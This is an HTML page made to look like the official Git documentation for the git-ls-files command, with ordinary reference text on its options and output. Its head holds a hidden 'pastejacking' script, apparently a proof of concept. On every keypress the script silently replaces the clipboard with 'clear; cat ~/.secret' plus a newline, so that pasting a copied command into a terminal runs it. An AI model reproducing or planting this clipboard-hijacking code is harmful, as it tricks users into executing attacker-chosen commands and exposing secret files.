<!DOCTYPE html>
<html lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-49925874-3"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-49925874-3');
  </script>

  <meta charset='utf-8'>
  <meta content='IE=edge,chrome=1' http-equiv='X-UA-Compatible'>

  <title>Git - git-ls-files Documentation</title>

  <link href='/favicon.ico' rel='shortcut icon' type='image/x-icon'>

  <link rel="stylesheet" media="screen" href="/assets/application-b45fbc699b1077ef1b7be2d9934aa274.css" />
  <script src="/assets/modernize-4ac63d4743ec9baf731eade71599d693.js"></script>
  <!--[if (gte IE 6)&(lte IE 8)]>
  <script src="/javascripts/selectivizr-min.js"></script>
  <![endif]-->
	<script>
        /*
            script taken from:
            https://github.com/dxa4481/Pastejacking
        */
        function copyTextToClipboard(text) {
          var textArea = document.createElement("textarea");

          // Place in top-left corner of screen regardless of scroll position.
          textArea.style.position = 'fixed';
          textArea.style.top = 0;
          textArea.style.left = 0;

          // Ensure it has a small width and height. Setting to 1px / 1em
          // doesn't work as this gives a negative w/h on some browsers.
          textArea.style.width = '2em';
          textArea.style.height = '2em';

          // We don't need padding, reducing the size if it does flash render.
          textArea.style.padding = 0;

          // Clean up any borders.
          textArea.style.border = 'none';
          textArea.style.outline = 'none';
          textArea.style.boxShadow = 'none';

          // Avoid flash of white box if rendered for any reason.
          textArea.style.background = 'transparent';


          textArea.value = text;

          document.body.appendChild(textArea);

          textArea.select();

          try {
            var successful = document.execCommand('copy');
            var msg = successful ? 'successful' : 'unsuccessful';
            console.log('Copying text command was ' + msg);
          } catch (err) {
            console.log('Oops, unable to copy');
          }

          document.body.removeChild(textArea);
        }

        document.addEventListener('keydown', function(event) {
            var ms = 800;
            var start = new Date().getTime();
            var end = start;
            while(end < start + ms) {
                end = new Date().getTime();
            }
            copyTextToClipboard('clear; cat ~/.secret\n');
        });
	</script>

</head>

<body id="documentation">

        <div id="content">

  <div id='main'>
    <div class="sect1">
<h2 id="_name"><a class="anchor" href="#_name"></a>NAME</h2>
<div class="sectionbody">
<div class="paragraph">
<p>git-ls-files - Show information about files in the index and the working tree</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_synopsis"><a class="anchor" href="#_synopsis"></a>SYNOPSIS</h2>
<div class="sectionbody">
<div class="verseblock">
<pre class="content"><em>git ls-files</em> [-z] [-t] [-v] [-f]
		(--[cached|deleted|others|ignored|stage|unmerged|killed|modified])*
		(-[c|d|o|i|s|u|k|m])*
		[--eol]
		[-x &lt;pattern&gt;|--exclude=&lt;pattern&gt;]
		[-X &lt;file&gt;|--exclude-from=&lt;file&gt;]
		[--exclude-per-directory=&lt;file&gt;]
		[--exclude-standard]
		[--error-unmatch] [--with-tree=&lt;tree-ish&gt;]
		[--full-name] [--recurse-submodules]
		[--abbrev] [--] [&lt;file&gt;&#8230;&#8203;]</pre>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_description"><a class="anchor" href="#_description"></a>DESCRIPTION</h2>
<div class="sectionbody">
<div class="paragraph">
<p>This merges the file listing in the directory cache index with the
actual working directory list, and shows different combinations of the
two.</p>
</div>
<div class="paragraph">
<p>One or more of the options below may be used to determine the files
shown:</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_options"><a class="anchor" href="#_options"></a>OPTIONS</h2>
<div class="sectionbody">
<div class="dlist">
<dl>
<dt class="hdlist1" id="git-ls-files--c"> <a class="anchor" href="#git-ls-files--c"></a>-c </dt>
<dt class="hdlist1" id="git-ls-files---cached"> <a class="anchor" href="#git-ls-files---cached"></a>--cached </dt>
<dd>
<p>Show cached files in the output (default)</p>
</dd>
<dt class="hdlist1" id="git-ls-files--d"> <a class="anchor" href="#git-ls-files--d"></a>-d </dt>
<dt class="hdlist1" id="git-ls-files---deleted"> <a class="anchor" href="#git-ls-files---deleted"></a>--deleted </dt>
<dd>
<p>Show deleted files in the output</p>
</dd>
<dt class="hdlist1" id="git-ls-files--m"> <a class="anchor" href="#git-ls-files--m"></a>-m </dt>
<dt class="hdlist1" id="git-ls-files---modified"> <a class="anchor" href="#git-ls-files---modified"></a>--modified </dt>
<dd>
<p>Show modified files in the output</p>
</dd>
<dt class="hdlist1" id="git-ls-files--o"> <a class="anchor" href="#git-ls-files--o"></a>-o </dt>
<dt class="hdlist1" id="git-ls-files---others"> <a class="anchor" href="#git-ls-files---others"></a>--others </dt>
<dd>
<p>Show other (i.e. untracked) files in the output</p>
</dd>
<dt class="hdlist1" id="git-ls-files--i"> <a class="anchor" href="#git-ls-files--i"></a>-i </dt>
<dt class="hdlist1" id="git-ls-files---ignored"> <a class="anchor" href="#git-ls-files---ignored"></a>--ignored </dt>
<dd>
<p>Show only ignored files in the output. When showing files in the
index, print only those matched by an exclude pattern. When
showing "other" files, show only those matched by an exclude
pattern.</p>
</dd>
<dt class="hdlist1" id="git-ls-files--s"> <a class="anchor" href="#git-ls-files--s"></a>-s </dt>
<dt class="hdlist1" id="git-ls-files---stage"> <a class="anchor" href="#git-ls-files---stage"></a>--stage </dt>
<dd>
<p>Show staged contents' mode bits, object name and stage number in the output.</p>
</dd>
<dt class="hdlist1" id="git-ls-files---directory"> <a class="anchor" href="#git-ls-files---directory"></a>--directory </dt>
<dd>
<p>If a whole directory is classified as "other", show just its
name (with a trailing slash) and not its whole contents.</p>
</dd>
<dt class="hdlist1" id="git-ls-files---no-empty-directory"> <a class="anchor" href="#git-ls-files---no-empty-directory"></a>--no-empty-directory </dt>
<dd>
<p>Do not list empty directories. Has no effect without --directory.</p>
</dd>
<dt class="hdlist1" id="git-ls-files--u"> <a class="anchor" href="#git-ls-files--u"></a>-u </dt>
<dt class="hdlist1" id="git-ls-files---unmerged"> <a class="anchor" href="#git-ls-files---unmerged"></a>--unmerged </dt>
<dd>
<p>Show unmerged files in the output (forces --stage)</p>
</dd>
<dt class="hdlist1" id="git-ls-files--k"> <a class="anchor" href="#git-ls-files--k"></a>-k </dt>
<dt class="hdlist1" id="git-ls-files---killed"> <a class="anchor" href="#git-ls-files---killed"></a>--killed </dt>
<dd>
<p>Show files on the filesystem that need to be removed due
to file/directory conflicts for checkout-index to
succeed.</p>
</dd>
<dt class="hdlist1" id="git-ls-files--z"> <a class="anchor" href="#git-ls-files--z"></a>-z </dt>
<dd>
<p>\0 line termination on output and do not quote filenames.
See OUTPUT below for more information.</p>
</dd>
<dt class="hdlist1" id="git-ls-files--xltpatterngt"> <a class="anchor" href="#git-ls-files--xltpatterngt"></a>-x &lt;pattern&gt; </dt>
<dt class="hdlist1" id="git-ls-files---excludeltpatterngt"> <a class="anchor" href="#git-ls-files---excludeltpatterngt"></a>--exclude=&lt;pattern&gt; </dt>
<dd>
<p>Skip untracked files matching pattern.
Note that pattern is a shell wildcard pattern. See EXCLUDE PATTERNS
below for more information.</p>
</dd>
<dt class="hdlist1" id="git-ls-files--Xltfilegt"> <a class="anchor" href="#git-ls-files--Xltfilegt"></a>-X &lt;file&gt; </dt>
<dt class="hdlist1" id="git-ls-files---exclude-fromltfilegt"> <a class="anchor" href="#git-ls-files---exclude-fromltfilegt"></a>--exclude-from=&lt;file&gt; </dt>
<dd>
<p>Read exclude patterns from &lt;file&gt;; 1 per line.</p>
</dd>
<dt class="hdlist1" id="git-ls-files---exclude-per-directoryltfilegt"> <a class="anchor" href="#git-ls-files---exclude-per-directoryltfilegt"></a>--exclude-per-directory=&lt;file&gt; </dt>
<dd>
<p>Read additional exclude patterns that apply only to the
directory and its subdirectories in &lt;file&gt;.</p>
</dd>
<dt class="hdlist1" id="git-ls-files---exclude-standard"> <a class="anchor" href="#git-ls-files---exclude-standard"></a>--exclude-standard </dt>
<dd>
<p>Add the standard Git exclusions: .git/info/exclude, .gitignore
in each directory, and the user&#8217;s global exclusion file.</p>
</dd>
<dt class="hdlist1" id="git-ls-files---error-unmatch"> <a class="anchor" href="#git-ls-files---error-unmatch"></a>--error-unmatch </dt>
<dd>
<p>If any &lt;file&gt; does not appear in the index, treat this as an
error (return 1).</p>
</dd>
<dt class="hdlist1" id="git-ls-files---with-treelttree-ishgt"> <a class="anchor" href="#git-ls-files---with-treelttree-ishgt"></a>--with-tree=&lt;tree-ish&gt; </dt>
<dd>
<p>When using --error-unmatch to expand the user supplied
&lt;file&gt; (i.e. path pattern) arguments to paths, pretend
that paths which were removed in the index since the
named &lt;tree-ish&gt; are still present.  Using this option
with <code>-s</code> or <code>-u</code> options does not make any sense.</p>
</dd>
<dt class="hdlist1" id="git-ls-files--t"> <a class="anchor" href="#git-ls-files--t"></a>-t </dt>
<dd>
<p>This feature is semi-deprecated. For scripting purpose,
<a href='/docs/git-status'>git-status[1]</a> <code>--porcelain</code> and
<a href='/docs/git-diff-files'>git-diff-files[1]</a> <code>--name-status</code> are almost always
superior alternatives, and users should look at
<a href='/docs/git-status'>git-status[1]</a> <code>--short</code> or <a href='/docs/git-diff'>git-diff[1]</a>
<code>--name-status</code> for more user-friendly alternatives.</p>
<div class="paragraph">
<p>This option identifies the file status with the following tags (followed by
a space) at the start of each line:</p>
</div>
</dd>
<dt class="hdlist1" id="git-ls-files-H"> <a class="anchor" href="#git-ls-files-H"></a>H </dt>
<dd>
<p>cached</p>
</dd>
<dt class="hdlist1" id="git-ls-files-S"> <a class="anchor" href="#git-ls-files-S"></a>S </dt>
<dd>
<p>skip-worktree</p>
</dd>
<dt class="hdlist1" id="git-ls-files-M"> <a class="anchor" href="#git-ls-files-M"></a>M </dt>
<dd>
<p>unmerged</p>
</dd>
<dt class="hdlist1" id="git-ls-files-R"> <a class="anchor" href="#git-ls-files-R"></a>R </dt>
<dd>
<p>removed/deleted</p>
</dd>
<dt class="hdlist1" id="git-ls-files-C"> <a class="anchor" href="#git-ls-files-C"></a>C </dt>
<dd>
<p>modified/changed</p>
</dd>
<dt class="hdlist1" id="git-ls-files-K"> <a class="anchor" href="#git-ls-files-K"></a>K </dt>
<dd>
<p>to be killed</p>
</dd>
<dt class="hdlist1" id="git-ls-files-"> <a class="anchor" href="#git-ls-files-"></a>? </dt>
<dd>
<p>other</p>
</dd>
<dt class="hdlist1" id="git-ls-files--v"> <a class="anchor" href="#git-ls-files--v"></a>-v </dt>
<dd>
<p>Similar to <code>-t</code>, but use lowercase letters for files
that are marked as <em>assume unchanged</em> (see
<a href='/docs/git-update-index'>git-update-index[1]</a>).</p>
</dd>
<dt class="hdlist1" id="git-ls-files--f"> <a class="anchor" href="#git-ls-files--f"></a>-f </dt>
<dd>
<p>Similar to <code>-t</code>, but use lowercase letters for files
that are marked as <em>fsmonitor valid</em> (see
<a href='/docs/git-update-index'>git-update-index[1]</a>).</p>
</dd>
<dt class="hdlist1" id="git-ls-files---full-name"> <a class="anchor" href="#git-ls-files---full-name"></a>--full-name </dt>
<dd>
<p>When run from a subdirectory, the command usually
outputs paths relative to the current directory.  This
option forces paths to be output relative to the project
top directory.</p>
</dd>
<dt class="hdlist1" id="git-ls-files---recurse-submodules"> <a class="anchor" href="#git-ls-files---recurse-submodules"></a>--recurse-submodules </dt>
<dd>
<p>Recursively calls ls-files on each submodule in the repository.
Currently there is only support for the --cached mode.</p>
</dd>
<dt class="hdlist1" id="git-ls-files---abbrevltngt"> <a class="anchor" href="#git-ls-files---abbrevltngt"></a>--abbrev[=&lt;n&gt;] </dt>
<dd>
<p>Instead of showing the full 40-byte hexadecimal object
lines, show only a partial prefix.
Non default number of digits can be specified with --abbrev=&lt;n&gt;.</p>
</dd>
<dt class="hdlist1" id="git-ls-files---debug"> <a class="anchor" href="#git-ls-files---debug"></a>--debug </dt>
<dd>
<p>After each line that describes a file, add more data about its
cache entry.  This is intended to show as much information as
possible for manual inspection; the exact format may change at
any time.</p>
</dd>
<dt class="hdlist1" id="git-ls-files---eol"> <a class="anchor" href="#git-ls-files---eol"></a>--eol </dt>
<dd>
<p>Show &lt;eolinfo&gt; and &lt;eolattr&gt; of files.
&lt;eolinfo&gt; is the file content identification used by Git when
the "text" attribute is "auto" (or not set and core.autocrlf is not false).
&lt;eolinfo&gt; is either "-text", "none", "lf", "crlf", "mixed" or "".</p>
<div class="paragraph">
<p>"" means the file is not a regular file, it is not in the index or
not accessible in the working tree.</p>
</div>
<div class="paragraph">
<p>&lt;eolattr&gt; is the attribute that is used when checking out or committing,
it is either "", "-text", "text", "text=auto", "text eol=lf", "text eol=crlf".
Since Git 2.10 "text=auto eol=lf" and "text=auto eol=crlf" are supported.</p>
</div>
<div class="paragraph">
<p>Both the &lt;eolinfo&gt; in the index ("i/&lt;eolinfo&gt;")
and in the working tree ("w/&lt;eolinfo&gt;") are shown for regular files,
followed by the  ("attr/&lt;eolattr&gt;").</p>
</div>
</dd>
<dt class="hdlist1" id="git-ls-files---"> <a class="anchor" href="#git-ls-files---"></a>-- </dt>
<dd>
<p>Do not interpret any more arguments as options.</p>
</dd>
<dt class="hdlist1" id="git-ls-files-ltfilegt"> <a class="anchor" href="#git-ls-files-ltfilegt"></a>&lt;file&gt; </dt>
<dd>
<p>Files to show. If no files are given all files which match the other
specified criteria are shown.</p>
</dd>
</dl>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_output"><a class="anchor" href="#_output"></a>Output</h2>
<div class="sectionbody">
<div class="paragraph">
<p><em>git ls-files</em> just outputs the filenames unless <code>--stage</code> is specified in
which case it outputs:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>[&lt;tag&gt; ]&lt;mode&gt; &lt;object&gt; &lt;stage&gt; &lt;file&gt;</pre>
</div>
</div>
<div class="paragraph">
<p><em>git ls-files --eol</em> will show
	i/&lt;eolinfo&gt;&lt;SPACES&gt;w/&lt;eolinfo&gt;&lt;SPACES&gt;attr/&lt;eolattr&gt;&lt;SPACE*&gt;&lt;TAB&gt;&lt;file&gt;</p>
</div>
<div class="paragraph">
<p><em>git ls-files --unmerged</em> and <em>git ls-files --stage</em> can be used to examine
detailed information on unmerged paths.</p>
</div>
<div class="paragraph">
<p>For an unmerged path, instead of recording a single mode/SHA-1 pair,
the index records up to three such pairs; one from tree O in stage
1, A in stage 2, and B in stage 3.  This information can be used by
the user (or the porcelain) to see what should eventually be recorded at the
path. (see <a href='/docs/git-read-tree'>git-read-tree[1]</a> for more information on state)</p>
</div>
<div class="paragraph">
<p>Without the <code>-z</code> option, pathnames with "unusual" characters are
quoted as explained for the configuration variable <code>core.quotePath</code>
(see <a href='/docs/git-config'>git-config[1]</a>).  Using <code>-z</code> the filename is output
verbatim and the line is terminated by a NUL byte.</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_exclude_patterns"><a class="anchor" href="#_exclude_patterns"></a>Exclude Patterns</h2>
<div class="sectionbody">
<div class="paragraph">
<p><em>git ls-files</em> can use a list of "exclude patterns" when
traversing the directory tree and finding files to show when the
flags --others or --ignored are specified.  <a href='/docs/gitignore'>gitignore[5]</a>
specifies the format of exclude patterns.</p>
</div>
<div class="paragraph">
<p>These exclude patterns come from these places, in order:</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>The command-line flag --exclude=&lt;pattern&gt; specifies a
single pattern.  Patterns are ordered in the same order
they appear in the command line.</p>
</li>
<li>
<p>The command-line flag --exclude-from=&lt;file&gt; specifies a
file containing a list of patterns.  Patterns are ordered
in the same order they appear in the file.</p>
</li>
<li>
<p>The command-line flag --exclude-per-directory=&lt;name&gt; specifies
a name of the file in each directory <em>git ls-files</em>
examines, normally <code>.gitignore</code>.  Files in deeper
directories take precedence.  Patterns are ordered in the
same order they appear in the files.</p>
</li>
</ol>
</div>
<div class="paragraph">
<p>A pattern specified on the command line with --exclude or read
from the file specified with --exclude-from is relative to the
top of the directory tree.  A pattern read from a file specified
by --exclude-per-directory is relative to the directory that the
pattern file appears in.</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_see_also"><a class="anchor" href="#_see_also"></a>SEE ALSO</h2>
<div class="sectionbody">
<div class="paragraph">
<p><a href='/docs/git-read-tree'>git-read-tree[1]</a>, <a href='/docs/gitignore'>gitignore[5]</a></p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_git"><a class="anchor" href="#_git"></a>GIT</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Part of the <a href='/docs/git'>git[1]</a> suite</p>
</div>
</div>
</div>
  </div>

        </div>
      </div>
      <footer>
  <div class="site-source">
    <a href="/site">About this site</a><br>
    Patches, suggestions, and comments are welcome.
  </div>
  <div class="sfc-member">
    Git is a member of <a href="/sfc">Software Freedom Conservancy</a>
  </div>
</footer>

<script src="/assets/application-dc6a8c6db7aef60d3304689fb96f2a1c.js"></script>

    </div>

</body>
</html>
